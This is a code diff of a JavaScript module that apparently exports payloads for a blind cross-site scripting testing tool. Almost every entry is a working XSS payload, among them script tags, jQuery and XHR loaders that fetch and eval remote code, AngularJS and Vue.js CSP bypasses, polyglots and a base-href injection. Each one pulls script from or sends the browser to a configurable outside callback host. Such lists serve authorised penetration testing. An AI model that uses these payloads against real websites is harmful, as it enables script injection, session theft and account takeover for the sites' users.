@@ -68,6 +68,16 @@ exports.payloadList = config => {
       )}'; onerror=eval(atob(this.id))></script>`
     },
     {
+      description: 'xsshunter.com - Matthew Bryant - jQuery Payload',
+      payload: `"><script>$.getScript("//${config.url}/m")</script>`
+    },
+    {
+      description: 'xsshunter.com - Matthew Bryant - XHR',
+      payload: `"><script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//${
+        config.url
+      }/m");a.send();</script>`
+    },
+    {
       description: 'Mario Heiderch - Angular/JS Payload',
       id: '9',
       payload: `{{constructor.constructor("d=document; _ = d.createElement('script');_.id='9';_.src='//${
@@ -129,66 +139,27 @@ exports.payloadList = config => {
       }/m\\\\';d.body.appendChild(_);\`)))+';astNode.argument={type:'Identifier',name:'foo'};");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}}`
     },
     {
-      description: 'Gareth Heyes/Sirdarckcat - AngularJS CSP Bypass - Nonce - HTTP Interaction',
-      id: '18',
-      payload: `<textarea autofocus ng-focus="d=$event.view.document;d.location='//${
-        config.url
-      }/mH'"></textarea>`
-    },
-    {
-      description: 'CSP Bypass - URL scheme/wildcard in script-src ',
-      id: '19',
+      description: 'CSP Bypass - data scheme/wildcard in script-src ',
       payload: `"><script src=data:text/javascript;base64,${this.encodePayloadHttpInteraction(
         config
-      )}></script>`
+      )}></script > `
     },
     {
-      description: 'CSP Bypass - Missing or relaxed object-src with script-src nonce',
-      id: '20',
-      payload: `"><embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\\"})))}catch(e){d=document; _ = d.createElement(\`script\`);_.nonce=d.querySelector(\`script\`).nonce||\`\`;_.id=\`20\`;_.src=\`//${
+      description: 'CSP Bypass - Missing or relaxed object-src',
+      payload: `"><embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\\"})))}catch (e) { d = document; d.location.hash.match(\`x1\`) ? \`\` : d.location=\`//localhost/mH\`}//' allowscriptaccess=always>`
+    },
+    {
+      description: 'Google Research - Vue.js ',
+      payload: `"><div v-html="''.constructor.constructor('d=document;d.location.hash.match(\\'x1\\') ? \`\` : d.location=\`//${
         config.url
-      }/m\`;d.body.appendChild(_)}//' allowscriptaccess=always>`
+      }/mH\`')()"> aaa</div>`
     },
     {
-      description: 'crlf - https://polyglot.innerht.ml/ - Polygot Payload',
-      id: '21',
-      payload: `javascript:"/*'/*\`/*--></noscript></title></textarea></style></template></noembed></script><html \\" onmouseover=/*&lt;svg/*/onload=eval("d=document; _ = d.createElement('script');_.id='20';_.src='//${
+      description:
+        'Adaption from Google Research + Gareth Heyes/Sirdarckcat - AngularJS CSP Bypass - HTTP Interaction',
+      payload: `<textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//${
         config.url
-      }/m';d.body.appendChild(_)")//>`
-    },
-    {
-      description: 'GoogleScriptGadget - Aurelia - CSP Bypass',
-      id: '21',
-      payload: `"TODO`
-    },
-    {
-      description: 'GoogleScriptGadget - Polymer - CSP Bypass',
-      id: '22',
-      payload: `"TODO`
-    },
-    {
-      description: 'GoogleScriptGadget - Vue.js - CSP Bypass',
-      id: '23',
-      payload: `<div v-html="''.constructor.constructor('d=document;s=d.createElement(\\'script\\');s.nonce=d.querySelector(\\'script[nonce]\\').nonce;s.src=\\'//${
-        config.url
-      }/m\\';d.x||d.body.appendChild(s);d.x=1')()"> aaa</div>`
-    },
-    {
-      description: 'CSP Bypass For Missing or Relaxed Object-Src',
-      id: '24',
-      payload: `TODO`
-    },
-    {
-      description: 'PortSwigger - BurpSuite Polygot Payload',
-      payload: `</script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source),s.stack=Error().stack,s.src=(/,/+/${
-        config.url
-      }.slice(2),document.documentElement.appendChild(s))//'>`
-    },
-    {
-      description: 'PortSwigger - BurpSuite HTTP Interaction Polygot Payload',
-      payload: `/*</script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+((new(Image)).src=((new(Image)).src=([]+//${
-        config.url
-      }/mH/).replace(/\\/g,[]))//'>`
+      }/mH'"></textarea>`
     },
     {
       description:
@@ -196,15 +167,10 @@ exports.payloadList = config => {
       payload: `"><base href="${config.url}">`
     },
     {
-      description: 'xsshunter.com - Matthew Bryant - jQuery Payload',
-      payload: `"><script>$.getScript("//${config.url}/m")</script>`
-    },
-    {
-      description:
-        'xsshunter.com - Matthew Bryant - XHR - To bypass unsafe-inline/unsafe-eval CSP policies',
-      payload: `"><script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//${
+      description: 'crlf - https://polyglot.innerht.ml/ - Polygot Payload',
+      payload: `javascript:"/*'/*\`/*--></noscript></title></textarea></style></template></noembed></script><html \\" onmouseover=/*&lt;svg/*/onload=document.location=\`//${
         config.url
-      }/m");a.send();</script>`
+      }/mH\`//>`
     }
   ];
   return payloads;
